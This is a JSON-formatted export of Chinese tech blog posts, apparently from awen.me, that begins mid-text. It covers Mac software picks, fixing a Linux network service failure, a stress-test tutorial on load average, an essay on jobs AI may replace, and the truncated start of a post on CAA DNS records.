所见即所得式的markdown编辑，可以直接粘贴表格程序会自动转换成markdown的表格源文件。 密码管理软件 1password 是非常棒的密码管理软件。 ORC 软件扫描王，有时候看个 PDF 电子书，需要做个笔记，文件无法复制，直接用扫描王将文件提取出来。 网络代理抓包 Surge，既可以当代理抓包，又可以XX出国 菜单管理bartender3 mac 菜单栏图标太多了，看着贼不爽，这软件可以将图标折叠隐藏起来。 网盘类 百度网盘 坚果云 凑合用，Dropbox 用着有点费劲 ##垃圾清理类 CleanMyMac 清理系统垃圾以及卸载程序之类 workflow todolist 日程安排 Alfred 好用到爆，谁用谁知道","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"Linux 重启network 失败的解决办法","slug":"Linux-重启network-失败的解决办法","date":"2019-03-26T04:02:14.000Z","updated":"2021-02-26T06:05:29.257Z","comments":true,"path":"posts/57567.html","link":"","permalink":"https://awen.me/posts/57567.html","excerpt":"执行systemctl restart network 失败","text":"执行systemctl restart network 失败 12345678910111213141516171819[root@ceph0 ~]# systemctl restart networkJob for network.service failed because the control process exited with error code. See &quot;systemctl status network.service&quot; and &quot;journalctl -xe&quot; for details.[root@ceph0 ~]# systemctl status network● network.service - LSB: Bring up&#x2F;down networking Loaded: loaded (&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;network; bad; vendor preset: disabled) Active: failed (Result: exit-code) since 二 2019-03-26 12:02:46 CST; 8s ago Docs: man:systemd-sysv-generator(8) Process: 3185106 ExecStart&#x3D;&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;network start (code&#x3D;exited, status&#x3D;1&#x2F;FAILURE)3月 26 12:02:46 ceph0 network[3185106]: RTNETLINK answers: File exists3月 26 12:02:46 ceph0 network[3185106]: RTNETLINK answers: File exists3月 26 12:02:46 ceph0 network[3185106]: RTNETLINK answers: File exists3月 26 12:02:46 ceph0 network[3185106]: RTNETLINK answers: File exists3月 26 12:02:46 ceph0 network[3185106]: RTNETLINK answers: File exists3月 26 12:02:46 ceph0 network[3185106]: RTNETLINK answers: File exists3月 26 12:02:46 ceph0 systemd[1]: network.service: control process exited, code&#x3D;exited status&#x3D;13月 26 12:02:46 ceph0 systemd[1]: Failed to start LSB: Bring up&#x2F;down networking.3月 26 12:02:46 ceph0 systemd[1]: Unit network.service entered failed state.3月 26 12:02:46 ceph0 systemd[1]: network.service failed. 看红色部门 Failed to start LSB: Bring up/down networking. 但是实际上这个信息并没有什么卵用 要是你拿着这个信息不假思索的去网上搜一圈，我相信你有可能失望而归。 CSDN 等博客都是你抄我，我抄你，从来都不验证下的，就是复制粘贴。 排查思路遇到这种问题，最好的办法就是看日志输出了啥咯，执行 tail -f /var/log/messages|grep network 123456789101112131415161718192021[root@ceph0 ~]# tail -f &#x2F;var&#x2F;log&#x2F;messages|grep networkMar 26 12:05:06 ceph0 systemd: Starting LSB: Bring up&#x2F;down networking...Mar 26 12:05:06 ceph0 network: Bringing up loopback interface: [ OK ]Mar 26 12:05:06 ceph0 network: Bringing up interface eth0: [ OK ]Mar 26 12:05:06 ceph0 network: Bringing up interface eth1: Error: Connection activation failed: No suitable device found for this connection.Mar 26 12:05:06 ceph0 network: [FAILED]Mar 26 12:05:06 ceph0 network: Bringing up interface eth2: Error: Connection activation failed: No suitable device found for this connection.Mar 26 12:05:06 ceph0 network: [FAILED]Mar 26 12:05:06 ceph0 network: RTNETLINK answers: File existsMar 26 12:05:06 ceph0 network: RTNETLINK answers: File existsMar 26 12:05:06 ceph0 network: RTNETLINK answers: File existsMar 26 12:05:06 ceph0 network: RTNETLINK answers: File existsMar 26 12:05:06 ceph0 network: RTNETLINK answers: File existsMar 26 12:05:06 ceph0 network: RTNETLINK answers: File existsMar 26 12:05:06 ceph0 network: RTNETLINK answers: File existsMar 26 12:05:06 ceph0 network: RTNETLINK answers: File existsMar 26 12:05:06 ceph0 network: RTNETLINK answers: File existsMar 26 12:05:06 ceph0 systemd: network.service: control process exited, code&#x3D;exited status&#x3D;1Mar 26 12:05:06 ceph0 systemd: Failed to start LSB: Bring up&#x2F;down networking.Mar 26 12:05:06 ceph0 systemd: Unit network.service entered failed state.Mar 26 12:05:06 ceph0 systemd: network.service failed. 可以看到报错 123Mar 26 12:05:06 ceph0 network: Bringing up interface eth1: Error: Connection activation failed: No suitable device found for this connection.Mar 26 12:05:06 ceph0 network: [FAILED]Mar 26 12:05:06 ceph0 network: Bringing up interface eth2: Error: Connection activation failed: No suitable device found for this connection. 很明显，没有eth1 和eth2 接口 导致报错，进入 /etc/sysconfig/network-scripts/ 123456789[root@ceph0 ~]# cd &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;[root@ceph0 network-scripts]# lsifcfg-eth0 ifdown-eth ifdown-post ifdown-tunnel ifup-ippp ifup-post ifup-tunnelifcfg-eth1 ifdown-ib ifdown-ppp ifup ifup-ipv6 ifup-ppp ifup-wirelessifcfg-eth2 ifdown-ippp ifdown-routes ifup-aliases ifup-isdn ifup-routes init.ipv6-globalifcfg-lo ifdown-ipv6 ifdown-sit ifup-bnep ifup-ovs ifup-sit network-functionsifdown ifdown-isdn ifdown-Team ifup-eth ifup-plip ifup-Team network-functions-ipv6ifdown-bnep ifdown-ovs ifdown-TeamPort ifup-ib ifup-plusb ifup-TeamPort[root@ceph0 network-scripts]# 删除eth1 和eth2 配置文件，重启网卡即可 123root@ceph0 network-scripts]# rm -rf ifcfg-eth1 ifcfg-eth2[root@ceph0 network-scripts]# systemctl restart network[root@ceph0 network-scripts]#","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"谈一谈Linux的平均负载","slug":"谈一谈Linux的平均负载","date":"2019-03-26T01:18:32.000Z","updated":"2021-02-26T06:05:29.358Z","comments":true,"path":"posts/55334.html","link":"","permalink":"https://awen.me/posts/55334.html","excerpt":"每当发现系统变慢，我们通常会执行top或uptime来了解系统的负载情况 12[root@ceph0 ~]# uptime 09:17:59 up 4 days, 10:39, 1 user, load average: 2.41, 2.64, 2.58","text":"每当发现系统变慢，我们通常会执行top或uptime来了解系统的负载情况 12[root@ceph0 ~]# uptime 09:17:59 up 4 days, 10:39, 1 user, load average: 2.41, 2.64, 2.58 上面的值分别表示 123409:17:59 系统当前时间up 4 days, 10:39, 系统运行的时间1 user 正在登陆的用户数量load average: 2.41, 2.64, 2.58 一分钟 5分钟 15分钟的平均负载值 平均负载load average 平均负载，这个词可能对于很多人来说是既熟悉又陌生的，什么是平均负载呢？ 我相信很多人可能会理解成这里的 load average: 2.41, 2.64, 2.58 是CPU的平均利用率，其实不是这样的。 你可以执行 man uptime 查看 uptime 的手册。其中DESCRIPTION 中就说明了 uptime 的作用 12345678DESCRIPTION uptime gives a one line display of the following information. The current time, how long the system has been running, how many users are currently logged on, and the system load averages for the past 1, 5, and 15 minutes. This is the same information contained in the header line displayed by w(1). System load averages is the average number of processes that are either in a runnable or uninterruptable state. A process in a runnable state is either using the CPU or waiting to use the CPU. A process in uninterruptable state is waiting for some I&#x2F;O access, eg waiting for disk. The averages are taken over the three time intervals. Load averages are not normalized for the number of CPUs in a system, so a load average of 1 means a single CPU system is loaded all the time while on a 4 CPU system it means it was idle 75% of the time. 简单来说，平均负载是指单位时间内，系统处于可运行状态和不可中断状态的平均进程数，也就是平均活跃进程数 所谓可运行状态的进程，是指正在使用CPU或者正在等待CPU的进程，也就是我们常用ps命令看到的，处于R状态(Running 或Runnable)的进程。 不可中断状态的进程则是正处于内核态关键流程中的进程，并且这些流程是不可打断的，比如最常见的是等待硬件设备的I/O响应，也就是我们在ps命令中看到的D状态(UninterruptibleSleep，也称为Disk Sleep)的进程。 比如，当一个进程向磁盘读写数据时，为了保证数据的一致性，在得到磁盘回复前，它是不能被其他进程或者中断打断的，这个时候的进程就处于不可中断状态。如果此时的进程被打断了，就容易出现磁盘数据与进程数据不一致的问题。 所以，不可中断状态实际，上是系统对进程和硬件设备的一种保护机制。 因此，你可以简单理解为，平均负载其实就是平均活跃进程数。平均活跃进程数，直观上的理解就是单位时间内的活跃进程数，但它实际上是活跃进程数的指数衰减平均值。这个“指数衰减平均”的详细含义你不用计较，这只是系统的一种更快速的计算方式，你把它直接当成活跃进程数的平均值也没问题。 既然平均的是活跃进程数，那么最理想的，就是每个 CPU 上都刚好运行着一个进程，这样每个CPU 都得到了充分利用。比如当平均负载为 2 时，意味着什么呢？ 在只有 2 个 CPU 的系统上，意味着所有的 CPU 都刚好被完全占用。 在 4 个 CPU 的系统上，意味着 CPU 有 50% 的空闲。 而在只有 1 个 CPU 的系统中，则意味着有一半的进程竞争不到 CPU。 平均负载多少为合理平均负载最理想的情况是等于 CPU 个数。所以在评判平均负载时，首先你要知道系统有几个 CPU，这可以通过 top 命令或者从文件 /proc/cpuinfo 中读取，比如： 12[root@ceph0 ~]# cat &#x2F;proc&#x2F;cpuinfo|grep &#39;model name&#39;|wc -l16 有了 CPU 个数，我们就可以判断出，当平均负载比 CPU 个数还大的时候，系统已经出现了过载。 我们看到 load average: 2.41, 2.64, 2.58 有三个值，到底该看哪一个呢？其实都要看，三个不同时间间隔的平均值，其实给我们提供了，分析系统负载趋势的数据来源，让我们能更全面、更立体地理解目前的负载状况。 打个比方，就像初秋时北京的天气，如果只看中午的温度，你可能以为还在 7 月份的大夏天呢。但如果你结合了早上、中午、晚上三个时间点的温度来看，基本就可以全方位了解这一天的天气情况了。 同样的，前面说到的 CPU 的三个负载时间段也是这个道理。 如果 1 分钟、5 分钟、15 分钟的三个值基本相同，或者相差不大，那就说明系统负载很平稳。 但如果 1 分钟的值远小于 15 分钟的值，就说明系统最近 1 分钟的负载在减少，而过去 15 分钟内却有很大的负载。 反过来，如果 1 分钟的值远大于 15 分钟的值，就说明最近 1 分钟的负载在增加，这种增加有可能只是临时性的，也有可能还会持续增加下去，所以就需要持续观察。一旦 1 分钟的平均负载接近或超过了 CPU 的个数，就意味着系统正在发生过载的问题，这时就得分析调查是哪里导致的问题，并要想办法优化了。 假设我们在一个单 CPU 系统上看到平均负载为 1.73，0.60，7.98，那么说明在过去 1 分钟内，系统有 73% 的超载，而在 15 分钟内，有 698 % 的超载，从整体趋势来看，系统的负载在降低。 平均负载多高，需要重点关注当平均负载高于 CPU 数量 70% 的时候，你就应该分析排查负载高的问题了。一旦负载过高，就可能导致进程响应变慢，进而影响服务的正常功能。 但 70% 这个数字并不是绝对的，最推荐的方法，还是把系统的平均负载监控起来，然后根据更多的历史数据，判断负载的变化趋势。当发现负载有明显升高趋势时，比如说负载翻倍了，你再去做分析和调查。 平均负载与 CPU 使用率现实工作中，我们经常容易把平均负载和 CPU 使用率混淆，所以在这里，我也做一个区分。 可能你会疑惑，既然平均负载代表的是活跃进程数，那平均负载高了，不就意味着 CPU 使用率高吗？ 我们还是要回到平均负载的含义上来，平均负载是指单位时间内，处于可运行状态和不可中断状态的进程数。所以，它不仅包括了正在使用 CPU 的进程，还包括等待 CPU 和等待 I/O 的进程。 而 CPU 使用率，是单位时间内 CPU 繁忙情况的统计，跟平均负载并不一定完全对应。比如： CPU 密集型进程，使用大量 CPU 会导致平均负载升高，此时这两者是一致的。 I/O 密集型进程，等待 I/O 也会导致平均负载升高，但 CPU 使用率不一定很高。 大量等待 CPU 的进程调度也会导致平均负载升高，此时的 CPU 使用率也会比较高。 案例分析下面，我们以三个示例分别来看这三种情况，并用 iostat、mpstat、pidstat 等工具，找出平均负载升高的根源。 1root@linux:~# apt install stress sysstat stress 是一个Linux 系统压测工具，可以用作异常进程模拟平均负载升高。 sysstat 包含了常用的Linux 性能工具，用来监控和分析系统性能，这里我们会用到 mpstat 和pidstat mpstat 是一个常用的多核 CPU 性能分析工具，用来实时查看每个CPU 的性能指标，以及所有 CPU 的平均指标。 pidstat 是一个常用的进程性能分析工具，用来实时查看进程 CPU、内存、I/O 以及上下文切换的性能指标。 场景一， CPU密集型进程分别开三个终端 1.模拟 CPU 100% 1root@linux:~# stress --cpu 1 --timeout 600 2.查看平均负载变化 -d 参数表示高亮显示变化的区域 1watch -d uptime 3.在第三个终端运行 mpstat 查看 CPU 使用率的变化情况： -P ALL 表示监控所有 CPU，后面数字 5 表示间隔 5 秒后输出一组数据 1mpstat -P ALL 5 12345610:02:45 AM CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle10:02:50 AM all 24.99 0.00 0.05 0.00 0.00 0.00 0.05 0.00 0.00 74.9110:02:50 AM 0 0.20 0.00 0.20 0.00 0.00 0.00 0.00 0.00 0.00 99.6010:02:50 AM 1 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 100.0010:02:50 AM 2 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 100.0010:02:50 AM 3 99.80 0.00 0.00 0.00 0.00 0.00 0.20 0.00 0.00 0.00 从终端二中可以看到，1 分钟的平均负载会慢慢增加到 1 ,而从终端三中还可以看到，有一个 CPU 的使用率达到 99.8% ，但是它的 iowait 只用 0 ，这说明，平均负载的升高正是由于 CPU 使用率增加造成的。 那么，到底是哪个进程导致了 CPU 使用率为 100% 呢？你可以使用 pidstat 来查询： 12345678910root@linux:~# pidstat -u 5 1Linux 4.4.0-21-generic (linux) 03&#x2F;26&#x2F;2019 _x86_64_ (4 CPU)10:03:31 AM UID PID %usr %system %guest %CPU CPU Command10:03:36 AM 0 2873 0.00 0.20 0.00 0.20 2 watch10:03:36 AM 0 2878 100.00 0.00 0.00 100.00 3 stressAverage: UID PID %usr %system %guest %CPU CPU CommandAverage: 0 2873 0.00 0.20 0.00 0.20 - watchAverage: 0 2878 100.00 0.00 0.00 100.00 - stress 从图中可以看出 是stress 导致的 CPU 占用 100% 场景二 I/O 密集型首先是运行 stress-ng 命令，这次模拟 I/O 压力，即不停地执行 sync： 为什么使用 stress-ng ，而不使用 stress 呢？ 我们在执行 stress –cpu 1 –timeout 600 时会发现：iowait无法升高，但是 %system 的使用率非常高问题。 这是因为案例中stress使用的是 sync() 系统调用，它的作用是刷新缓冲区内存到磁盘中。我这里的机器是新安装的虚拟机，缓冲区可能比较小，无法产生大的 IO 压力，这样大部分就都是系统调用的消耗了。 解决方法是使用stress的下一代stress-ng，它支持更丰富的选项，比如 stress-ng -i 1 –hdd 1 –timeout 600（–hdd表示读写临时文件）。 123root@linux:~# stress-ng -i 1 --hdd 1 --timeout 600stress-ng: info: [7084] dispatching hogs: 1 hdd, 1 iosyncstress-ng: info: [7084] cache allocate: default cache size: 16384K 然后观察 uptime 110:49:52 up 1:11, 6 users, load average: 5.20, 5.05, 2.57 观察mpstat 1234567# mpstat -P ALL 5 10Average: CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idleAverage: all 0.07 0.00 3.03 47.74 0.00 0.01 0.04 0.00 0.00 49.12Average: 0 0.06 0.00 0.54 21.93 0.00 0.00 0.00 0.00 0.00 77.47Average: 1 0.12 0.00 0.54 9.15 0.00 0.00 0.02 0.00 0.00 90.17Average: 2 0.02 0.00 0.97 74.55 0.00 0.00 0.02 0.00 0.00 24.45Average: 3 0.06 0.00 10.11 85.68 0.00 0.00 0.10 0.00 0.00 4.05 发现 1分钟负载增加到5.20 时 有一个 CPU 使用率 升高到了10.11 而iowait 则达到了 85.68 。 可以看到是 stress-ng-hdd 这个进程导致的。 1234567891011121314151617181920root@linux:~# pidstat -u 5 1Linux 4.4.0-21-generic (linux) 03&#x2F;26&#x2F;2019 _x86_64_ (4 CPU)10:51:52 AM UID PID %usr %system %guest %CPU CPU Command10:51:57 AM 0 7 0.00 0.20 0.00 0.20 0 rcu_sched10:51:57 AM 0 240 0.00 0.20 0.00 0.20 2 jbd2&#x2F;vda1-810:51:57 AM 0 268 0.00 0.20 0.00 0.20 1 systemd-journal10:51:57 AM 0 615 0.00 0.20 0.00 0.20 1 qemu-ga10:51:57 AM 0 5417 0.20 0.20 0.00 0.40 0 watch10:51:57 AM 0 7085 0.20 10.00 0.00 10.20 3 stress-ng-hdd10:51:57 AM 0 7087 0.00 2.00 0.00 2.00 2 kworker&#x2F;u128:3Average: UID PID %usr %system %guest %CPU CPU CommandAverage: 0 7 0.00 0.20 0.00 0.20 - rcu_schedAverage: 0 240 0.00 0.20 0.00 0.20 - jbd2&#x2F;vda1-8Average: 0 268 0.00 0.20 0.00 0.20 - systemd-journalAverage: 0 615 0.00 0.20 0.00 0.20 - qemu-gaAverage: 0 5417 0.20 0.20 0.00 0.40 - watchAverage: 0 7085 0.20 10.00 0.00 10.20 - stress-ng-hddAverage: 0 7087 0.00 2.00 0.00 2.00 - kworker&#x2F;u128:3 场景三 大量进程的场景当系统中运行进程超出 CPU 运行能力时，就会出现等待 CPU 的进程。 模拟32个进程 12root@linux:~# stress -c 32 --timeout 600stress: info: [7573] dispatching hogs: 16 cpu, 0 io, 0 vm, 0 hdd ​ 由于系统只有 16 个CPU，明显比 32 个进程要少得多，因而，系统的 CPU 处于严重过载状态，平均负载高达25.16 114:02:27 up 4:24, 3 users, load average: 25.16, 8.53, 3.08 查看pid 12345678910111213141516171819202122root@linux:~# pidstat -u 5 1Linux 4.4.0-21-generic (linux) 03&#x2F;26&#x2F;2019 _x86_64_ (4 CPU)11:12:50 AM UID PID %usr %system %guest %CPU CPU Command11:12:55 AM 0 8255 49.90 0.00 0.00 49.90 0 stress11:12:55 AM 0 8256 49.90 0.00 0.00 49.90 2 stress11:12:55 AM 0 8257 49.90 0.00 0.00 49.90 3 stress11:12:55 AM 0 8258 49.90 0.00 0.00 49.90 1 stress11:12:55 AM 0 8259 49.90 0.00 0.00 49.90 3 stress11:12:55 AM 0 8260 49.90 0.00 0.00 49.90 0 stress11:12:55 AM 0 8261 50.10 0.00 0.00 50.10 1 stress11:12:55 AM 0 8262 49.70 0.00 0.00 49.70 2 stressAverage: UID PID %usr %system %guest %CPU CPU CommandAverage: 0 8255 49.90 0.00 0.00 49.90 - stressAverage: 0 8256 49.90 0.00 0.00 49.90 - stressAverage: 0 8257 49.90 0.00 0.00 49.90 - stressAverage: 0 8258 49.90 0.00 0.00 49.90 - stressAverage: 0 8259 49.90 0.00 0.00 49.90 - stressAverage: 0 8260 49.90 0.00 0.00 49.90 - stressAverage: 0 8261 50.10 0.00 0.00 50.10 - stressAverage: 0 8262 49.70 0.00 0.00 49.70 - stress 会发现 pidstat输出中没有%wait的问题，是因为CentOS默认的sysstat稍微有点老，源码或者RPM升级到11.5.5版本以后就可以看到了。而Ubuntu的包一般都比较新，没有这个问题。 *源码安装sysstat * 12345678git clone --depth&#x3D;50 --branch&#x3D;master https:&#x2F;&#x2F;github.com&#x2F;sysstat&#x2F;sysstat.git sysstat&#x2F;sysstatcd sysstat&#x2F;sysstatgit checkout -qf 6886152fb3af82376318c35eda416c3ce611121dexport TRAVIS_COMPILER&#x3D;gccexport CC&#x3D;gccexport CC_FOR_BUILD&#x3D;gcc .&#x2F;configure --disable-nls --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F; make &amp;&amp;make install 再次查看 123456789101112131415161718192021222324252627282930313233Average: UID PID %usr %system %guest %wait %CPU CPU CommandAverage: 0 16802 12.38 0.00 0.00 86.83 12.38 - stressAverage: 0 16803 12.57 0.00 0.00 87.43 12.57 - stressAverage: 0 16804 12.57 0.00 0.00 87.82 12.57 - stressAverage: 0 16805 12.38 0.00 0.00 87.82 12.38 - stressAverage: 0 16806 12.38 0.00 0.00 87.23 12.38 - stressAverage: 0 16807 12.38 0.00 0.00 87.23 12.38 - stressAverage: 0 16808 12.38 0.00 0.00 87.23 12.38 - stressAverage: 0 16809 12.38 0.00 0.00 87.82 12.38 - stressAverage: 0 16810 12.38 0.00 0.00 87.82 12.38 - stressAverage: 0 16811 12.38 0.00 0.00 87.43 12.38 - stressAverage: 0 16812 12.38 0.00 0.00 87.43 12.38 - stressAverage: 0 16813 12.38 0.00 0.00 87.43 12.38 - stressAverage: 0 16814 12.57 0.00 0.00 87.62 12.57 - stressAverage: 0 16815 12.38 0.00 0.00 87.82 12.38 - stressAverage: 0 16816 12.57 0.00 0.00 87.03 12.57 - stressAverage: 0 16817 12.38 0.00 0.00 87.23 12.38 - stressAverage: 0 16818 12.57 0.00 0.00 87.23 12.57 - stressAverage: 0 16819 12.57 0.00 0.00 87.82 12.57 - stressAverage: 0 16820 12.57 0.00 0.00 87.23 12.57 - stressAverage: 0 16821 12.57 0.00 0.00 87.62 12.57 - stressAverage: 0 16822 12.38 0.00 0.00 87.43 12.38 - stressAverage: 0 16823 12.57 0.00 0.00 87.62 12.57 - stressAverage: 0 16824 12.38 0.00 0.00 87.43 12.38 - stressAverage: 0 16825 12.57 0.00 0.00 87.03 12.57 - stressAverage: 0 16826 12.57 0.00 0.00 87.23 12.57 - stressAverage: 0 16827 12.38 0.00 0.00 87.43 12.38 - stressAverage: 0 16828 12.57 0.00 0.00 87.23 12.57 - stressAverage: 0 16829 12.57 0.00 0.00 87.43 12.57 - stressAverage: 0 16830 12.57 0.00 0.00 87.82 12.57 - stressAverage: 0 16831 12.57 0.00 0.00 87.23 12.57 - stressAverage: 0 16832 12.57 0.00 0.00 87.23 12.57 - stressAverage: 0 16833 12.38 0.00 0.00 87.82 12.38 - stress 可以看出，8 个进程在争抢 2 个 CPU，每个进程等待 CPU 的时间（也就是代码块中的 %wait 列）高达 87.82%。这些超出 CPU 计算能力的进程，最终导致 CPU 过载。 本文为极客时间 《Linux性能优化实战》笔记 如果你也想学习 Linux 性能优化，可以扫描下方图片二维码报名","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"程序员会被AI 替代吗","slug":"程序员会被AI-替代吗","date":"2019-03-25T10:28:42.000Z","updated":"2021-02-26T06:05:29.349Z","comments":true,"path":"posts/48792.html","link":"","permalink":"https://awen.me/posts/48792.html","excerpt":"笔者目前从事云计算行业的客户服务性岗位，虽然工作上需要用到各种技术，比如各种云服务背后的原理和产品定制化的细节，例如虚拟化技术、 Windows server 、Linux 系统的技术、各种关系型数据库非关系型数据库、容器服务、k8s、负载均衡等产品的背后原理和技术，需要能够自己搭建相关的服务，对于用户遇到的问题能够复现客户出现的问题并提供解决方案，但是我始终觉得这个岗位就是比一般客服高级一点的”客服”人员，本质上还是个客服。","text":"笔者目前从事云计算行业的客户服务性岗位，虽然工作上需要用到各种技术，比如各种云服务背后的原理和产品定制化的细节，例如虚拟化技术、 Windows server 、Linux 系统的技术、各种关系型数据库非关系型数据库、容器服务、k8s、负载均衡等产品的背后原理和技术，需要能够自己搭建相关的服务，对于用户遇到的问题能够复现客户出现的问题并提供解决方案，但是我始终觉得这个岗位就是比一般客服高级一点的”客服”人员，本质上还是个客服。 日常工作就是通过各种通讯工具、在线工单、在线IM等方式接待和处理来访用户的各种产品使用问题和遇到的一些故障等售后问题，有时候遇到奇葩用户，还要陪他扯淡闲聊。 公司给我们组定的服务 KPI， 要求响应用户问题要在5分钟之内响应，如果没有响应就会被扣绩效。 在工作一段时间后，我发现这个岗位变得有些枯燥无味，事实上，我觉得大多数岗位干时间长了其实都挺枯燥无味的，因为日常工作中总结发现大部分用户遇到的问题都非常的类似，甚至重复。处理客户问题的流程也非常一致。对于这些重复性的工作，我实在是没多少耐心和兴趣，而且为了保证这个5分钟响应，我上个厕所、吃个饭都得琢磨下会不会有用户接入而导致忘记回复从而被扣绩效。 面对这种情况，我决定梳理下自己的工作，把自己的工作自动化起来。 首先，要解决的就是这个 5 分钟超时问题，我不可能无时无刻的去盯着各种客户群，于是，我通过 Python 实现了获取到最新的未受理的工单和和未受理的在线 IM 信息，进行处理和判断，如果是用户回复的，并且时间快超过5分钟就通过电话、短信、等方式通知我去处理。这样就很轻松的解决了 KPI 的 5分钟响应问题。 对于已经解决的问题此前都是需要人工手动去关闭，我也把他实现为超过一定时间客户未答复就自动关闭。如果我们回复用户后一段时间客户没有答复，我也用程序去自动回复客户一条信息要求用户尽快回复并确认是否已经解决。 其次，我梳理了工作中常见的问题，将其整理成问答模式，然后通过程序去获取用户的提问并与问题库中的数据进行匹配查找，如果匹配度超过 90%，就答复用户。这样又解决了一部分重复性问题的自动回复。 最后，对于用户提的问题没能解决的，我们需要反馈后端开发人员和产品人员去处理跟踪，在这个过程中我也通过程序实现了一部分自动化，如果开发人员有回复就自动通过 IM 方式通知我，如果超过一段时间没回复就自动催开发。 干到这里，我发现很细思极恐的事情，我已经将工作中70% 的问题都实现了自动化了，日常工作仅仅就很少部分的工作内容需要人工介入处理， 都是一些需要和各个团队沟通协作的事情，那这份工作还有啥存在的必要呢？ 可能也就是一些复杂的沟通上的问题还需要人介入处理吧！ 目前 AI 已经发展迅速，通过机器学习等技术去解决一些问题会比人类去解决效率更高更快，更有质量！ 哪些岗位会被 AI 替代BBC曾预测未来 20个将会被人工智能淘汰的职业，其中就包括： 电话推销员 在 BBC 所统计的三百多个职业里，“电话推销员”被机器人取代的几率为最大，接近百分之百。即使没有机器人的出现，这样一个单调、重复、恼人，又毫无效率可言的工种也是迟早要消亡的。 今年315晚会上就被爆出机器人骚扰电话黑色产业链，而晚会过后不久阿里就宣布推出防骚扰电话AI技术在315后爆红，阿里方面称机器人的问题交给机器人对付。 在放出的视频Demo中，阿里AI实验室推出防骚扰电话AI，并且在一段完整推销电话中，人类女推销员一方，全程毫无察觉…… 可以想象2个机器人之间互相聊天的画面。 打字员 笔者大学学的是文科的，记得大学还学过一门课，叫”速记”，就是在会议现场通过快速记录的方式来对会议内容进行记录，因为需要速度很快，所以不可能和正常写字一样，而是用一堆类似蝌蚪文的符合代替汉字，可以看下下图这些和蝌蚪文一样的内容就是速记内容。 而如今语音识别技术已经非常成熟，在今年两会上，科大讯飞就助力人民日报两会报道，联手打造“声速两会”。 通过讯飞的产品一键连接，迅速将录音转写成文字报道，随即将文字传输进入人民日报新闻业务系统，实现移动查看、电脑端写稿、投送稿库的全流程采访写稿，支持实时“中译英”、“英译中”转文字稿，行云流水地锻造出“声速两会”播报。 可想而知，几年前的”速记”，早已经无用武之地了。 会计 与技能基础，且日薄西山的电话推销、打字不同，会计这样一份要求不算低，职业前景也被社会主流看好的职业竟有高达 97.6% 的几率被机器人取代，着实令人意外。 不过，会计工作的本质便是信息搜集和整理工作，内部存在着严格的逻辑要求，天生就要求 100% 准确，从结果上来看，机器智能操作的优势的确明显。 事实上，今年全球四大会计师事务所中的德勤、普华永道和安永相继推出了财务智能机器人方案，给业内造成了不小的震动。 银行职员 除了单调、重复，“低效率”也是造成某些职业被自动化取代的一大因素，比方说银行职员。 其实现代人习惯排队了，排地铁排挂号排奶茶排鲍师傅都不在话下，即便如此，在银行办业务时排的漫漫长队还是足以击溃一个文明人的忍耐底线。 政府职员 BBC 的研究人员在这里所指的是政府底层职能机构的职员。 在英国今年年初的一项调查中，有1／4的受访者认为，相比人类，机器人有更好的从政能力；66% 的人认为，至 2037 年，就会有机器人在政府任职；16% 的人认为，在未来的一至两年中，就会出现机器人担任政府官员的现象。 客服 早在十几年前，微软便开发出了具有总机接线员功能的智能语音系统；而近些年来，随着人工智能的发展，人类接线员的绝大部分工作基本都可以被自动完成。 前台 机器人前台这两年已经多次登上了新闻标题，话题度最高的是由日本软银公司开发的 Pepper。目前，日本以及欧美多国都已经有医院、银行、电器店之类的机构购买了 Pepper，作为前台接待人员使用。 保险业务员 近几年平安保险、泰康在线、太平洋保险、弘康人寿、安邦人寿、富德生命等多家险企已将智能科技引入到公司业务上，目前主要应用于售后领域。但业内预测，不久的将来，人工智能将替代销售人员，成为个人保险智能管家。 现在买保险都可以通过在线核保，非常方便，完全无需人工介入。 人事在未来，不单单是员工本身，就连负责招募员工、解雇员工的 HR 也有可能会被机器人取代。 通过机器学习、自然语言处理、聊天机器人等人工智能技术，机械 HR 能完成很多人力资源管理者所要求的基本技能。 今年 3 月，由北美著名猎头公司 SourceCon 举办的一年一度的行业竞赛中，一个名为“Brilent”的机器只用 3.2 秒便筛选出合适的候选人 主播、演员、艺人 今年搜狗联合新华社推出站立式AI合成主播，参与2019年两会报道。 目前就有网友通过 AI 合成 将朱茵在《射雕英雄传》中的“黄蓉”形象，换成了杨幂的脸。 翻译 在语言学习上，机器和人工智能已经走到了一个令人惊叹和警惕的地步。目前市面上已经有很多翻译工具，且翻译准确度非常高。 如何判断自己工作是否会被AI替代如果你的工作包含以下三类技能要求，那么，被机器人取代的可能性就会非常小： 社交能力、协商能力、以及人情练达的艺术； 同情心、以及对他人真心实意的扶助和关切； 创意能力和审美能力。 如果你的工作符合以下特征，那么，被机器人取代的可能性就会非常大： 无需天赋，经由训练即可掌握的技能； 大量的重复性劳动，每天上班无需过脑，但手熟尔； 工作空间狭小，坐在格子间里，不闻天下事。 程序员会被 AI 替代吗？理论上来说，机器人完成基础的编程工作是完全可行的。不过目前来看，依然只是一个理论上的方案，即便有朝一日实现了，也替代不了所有的程序员。只能像无人驾驶一样，承担更多的驾驶工作，而非淘汰驾驶员本身。所以程序员们目前还无需过多担心。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"域名解析之 CAA","slug":"域名解析之-CAA","date":"2019-03-22T03:16:24.000Z","updated":"2021-02-26T06:05:29.322Z","comments":true,"path":"posts/11948.html","link":"","permalink":"https://awen.me/posts/11948.html","excerpt":"由于之前把域名托管在 cloudflare ，感觉解析比较慢，于是换到了阿里云，为了使用 letsencrypt 自动续签证书功能，我决定重新使用阿里云的 ak和sk 申请一下证书，在使用 letsencrypt 签发证书时发现报错缺少 CAA","text":"由于之前把域名托管在 cloudflare ，感觉解析比较慢，于是换到了阿里云，为了使用 letsencrypt 自动续签证书功能，我决定重新使用阿里云的 ak和sk 申请一下证书，在使用 letsencrypt 